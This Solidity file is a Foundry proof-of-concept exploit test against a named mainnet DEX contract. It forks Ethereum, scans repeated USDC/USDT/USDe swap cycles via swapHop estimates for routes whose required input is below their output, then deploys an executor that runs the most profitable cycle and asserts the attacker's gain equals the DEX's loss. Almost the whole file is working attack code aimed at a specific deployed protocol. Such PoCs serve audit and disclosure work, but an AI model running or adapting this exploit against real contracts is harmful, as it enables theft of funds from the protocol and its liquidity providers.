// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";

struct DexKeyAmplification {
    address token0;
    address token1;
    bytes32 salt;
}

struct TransferParamsAmplification {
    address to;
    bool isCallback;
    bytes callbackData;
    bytes extraData;
}

interface IDexLiteAmplification {
    function swapHop(
        address[] calldata path,
        DexKeyAmplification[] calldata dexKeys,
        int256 amountSpecified,
        uint256[] calldata amountLimits,
        TransferParamsAmplification calldata transferParams
    ) external payable returns (uint256 amountUnspecified);
}

interface IERC20Amplification {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDexLiteCallbackAmplification {
    function dexCallback(address token, uint256 amount, bytes calldata data) external;
}

contract DexLiteGenericCycleExecutor is IDexLiteCallbackAmplification {
    address internal constant DEX_LITE = 0xBbcb91440523216e2b87052A99F69c604A7b6e00;

    function execute(
        address[] memory path,
        DexKeyAmplification[] memory keys,
        uint256 amountOut
    ) external returns (uint256 requiredInput) {
        uint256[] memory limits = new uint256[](keys.length);
        for (uint256 i; i < limits.length; ++i) limits[i] = type(uint256).max;
        requiredInput = IDexLiteAmplification(DEX_LITE).swapHop(
            path,
            keys,
            -int256(amountOut),
            limits,
            TransferParamsAmplification(address(this), true, "", "")
        );
    }

    function dexCallback(address token, uint256 amount, bytes calldata) external {
        require(msg.sender == DEX_LITE, "ONLY_DEX_LITE");
        require(IERC20Amplification(token).transfer(DEX_LITE, amount), "PAYBACK_FAILED");
    }
}

contract DexLiteCycleAmplificationSearchTest is Test {
    address internal constant DEX_LITE = 0xBbcb91440523216e2b87052A99F69c604A7b6e00;
    address internal constant USDC = 0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    bytes32 internal constant ESTIMATE_SWAP = keccak256(bytes("ESTIMATE_SWAP"));
    bytes4 internal constant ESTIMATE_SELECTOR = bytes4(keccak256("EstimateSwap(uint256)"));

    DexKeyAmplification internal usdcUsdt;
    DexKeyAmplification internal usdeUsdt;

    uint256 internal bestGain;
    uint256 internal bestSpecified;
    uint256 internal bestRouteKind;
    uint256 internal bestRepeats;

    event Candidate(
        uint256 indexed routeKind,
        uint256 repeats,
        uint256 hops,
        uint256 specified,
        uint256 requiredInput,
        uint256 gain
    );
    event NewBest(
        uint256 indexed routeKind,
        uint256 repeats,
        uint256 hops,
        uint256 specified,
        uint256 requiredInput,
        uint256 gain
    );
    event ActualExecution(
        uint256 indexed routeKind,
        uint256 repeats,
        uint256 specified,
        uint256 requiredInput,
        uint256 attackerGain,
        uint256 dexLoss,
        uint256 gasUsed
    );
    event SearchSummary(
        uint256 routeKind,
        uint256 repeats,
        uint256 specified,
        uint256 gain
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("MAINNET_FORK_BLOCK"));
        assertEq(block.chainid, 1, "unexpected chain");
        usdcUsdt = DexKeyAmplification(USDC, USDT, bytes32(0));
        usdeUsdt = DexKeyAmplification(USDE, USDT, bytes32(0));
    }

    // routeKind:
    // 0 = USDe <-> USDT repeated same pool
    // 1 = USDC <-> USDT repeated same pool
    // 2 = USDC-USDT-USDe-USDT-USDC composite repeated
    // 3 = USDe-USDT-USDC-USDT-USDe composite repeated
    function _buildRoute(uint256 routeKind, uint256 repeats)
        internal
        view
        returns (address[] memory path, DexKeyAmplification[] memory keys)
    {
        uint256 unitHops = routeKind < 2 ? 2 : 4;
        uint256 hops = unitHops * repeats;
        path = new address[](hops + 1);
        keys = new DexKeyAmplification[](hops);

        if (routeKind == 0) {
            path[0] = USDE;
            for (uint256 i; i < hops; ++i) {
                path[i + 1] = path[i] == USDE ? USDT : USDE;
                keys[i] = usdeUsdt;
            }
        } else if (routeKind == 1) {
            path[0] = USDC;
            for (uint256 i; i < hops; ++i) {
                path[i + 1] = path[i] == USDC ? USDT : USDC;
                keys[i] = usdcUsdt;
            }
        } else if (routeKind == 2) {
            path[0] = USDC;
            for (uint256 r; r < repeats; ++r) {
                uint256 o = r * 4;
                path[o + 1] = USDT;
                path[o + 2] = USDE;
                path[o + 3] = USDT;
                path[o + 4] = USDC;
                keys[o] = usdcUsdt;
                keys[o + 1] = usdeUsdt;
                keys[o + 2] = usdeUsdt;
                keys[o + 3] = usdcUsdt;
            }
        } else {
            path[0] = USDE;
            for (uint256 r; r < repeats; ++r) {
                uint256 o = r * 4;
                path[o + 1] = USDT;
                path[o + 2] = USDC;
                path[o + 3] = USDT;
                path[o + 4] = USDE;
                keys[o] = usdeUsdt;
                keys[o + 1] = usdcUsdt;
                keys[o + 2] = usdcUsdt;
                keys[o + 3] = usdeUsdt;
            }
        }
    }

    function _estimate(
        address[] memory path,
        DexKeyAmplification[] memory keys,
        uint256 amountOut
    ) internal returns (bool ok, uint256 requiredInput) {
        uint256[] memory limits = new uint256[](keys.length);
        for (uint256 i; i < limits.length; ++i) limits[i] = type(uint256).max;
        try IDexLiteAmplification(DEX_LITE).swapHop(
            path,
            keys,
            -int256(amountOut),
            limits,
            TransferParamsAmplification(address(0), false, "", abi.encode(ESTIMATE_SWAP))
        ) returns (uint256) {
            return (false, 0);
        } catch (bytes memory reason) {
            if (reason.length != 36) return (false, 0);
            bytes4 selector;
            assembly ("memory-safe") {
                selector := mload(add(reason, 0x20))
                requiredInput := mload(add(reason, 0x24))
            }
            ok = selector == ESTIMATE_SELECTOR;
        }
    }

    function _probe(uint256 routeKind, uint256 repeats, uint256 amountOut) internal {
        (address[] memory path, DexKeyAmplification[] memory keys) = _buildRoute(routeKind, repeats);
        (bool ok, uint256 requiredInput) = _estimate(path, keys, amountOut);
        if (!ok || requiredInput >= amountOut) return;
        uint256 gain = amountOut - requiredInput;
        emit Candidate(routeKind, repeats, keys.length, amountOut, requiredInput, gain);
        if (gain > bestGain) {
            bestGain = gain;
            bestSpecified = amountOut;
            bestRouteKind = routeKind;
            bestRepeats = repeats;
            emit NewBest(routeKind, repeats, keys.length, amountOut, requiredInput, gain);
        }
    }

    function _scanUsdeFine() internal {
        // 0.00001 to 0.02000 USDe, step 0.00001 USDe.
        for (uint256 i = 1; i <= 2000; ++i) {
            _probe(0, 1, i * 1e13);
        }
    }

    function _scanRepeatedRoutes() internal {
        uint256[9] memory repeats = [uint256(1), 2, 4, 8, 16, 32, 64, 128, 256];
        uint256[8] memory usdcSizes = [uint256(10), 100, 1_000, 10_000, 100_000, 1_000_000, 10_000_000, 100_000_000];
        uint256[8] memory usdeSizes = [uint256(1e13), 1e14, 1e15, 2e15, 3e15, 5e15, 1e16, 1e17];

        for (uint256 r; r < repeats.length; ++r) {
            for (uint256 s; s < usdcSizes.length; ++s) {
                _probe(1, repeats[r], usdcSizes[s]);
                _probe(2, repeats[r], usdcSizes[s]);
            }
            for (uint256 s; s < usdeSizes.length; ++s) {
                _probe(0, repeats[r], usdeSizes[s]);
                _probe(3, repeats[r], usdeSizes[s]);
            }
        }
    }

    function _executeBest() internal {
        (address[] memory path, DexKeyAmplification[] memory keys) = _buildRoute(bestRouteKind, bestRepeats);
        address endpoint = path[0];
        DexLiteGenericCycleExecutor executor = new DexLiteGenericCycleExecutor();
        IERC20Amplification token = IERC20Amplification(endpoint);
        assertEq(token.balanceOf(address(executor)), 0, "executor not empty");

        uint256 attackerBefore = token.balanceOf(address(executor));
        uint256 dexBefore = token.balanceOf(DEX_LITE);
        uint256 gasBefore = gasleft();
        uint256 requiredInput = executor.execute(path, keys, bestSpecified);
        uint256 gasUsed = gasBefore - gasleft();
        uint256 attackerGain = token.balanceOf(address(executor)) - attackerBefore;
        uint256 dexLoss = dexBefore - token.balanceOf(DEX_LITE);

        emit ActualExecution(
            bestRouteKind,
            bestRepeats,
            bestSpecified,
            requiredInput,
            attackerGain,
            dexLoss,
            gasUsed
        );
        assertEq(attackerGain, bestSpecified - requiredInput, "quote/execution mismatch");
        assertEq(dexLoss, attackerGain, "loss/gain mismatch");
    }

    function test_searchAndExecuteBestCycle() public {
        _scanUsdeFine();
        _scanRepeatedRoutes();
        emit SearchSummary(bestRouteKind, bestRepeats, bestSpecified, bestGain);
        assertGt(bestGain, 0, "no positive cycle");
        _executeBest();
    }
}
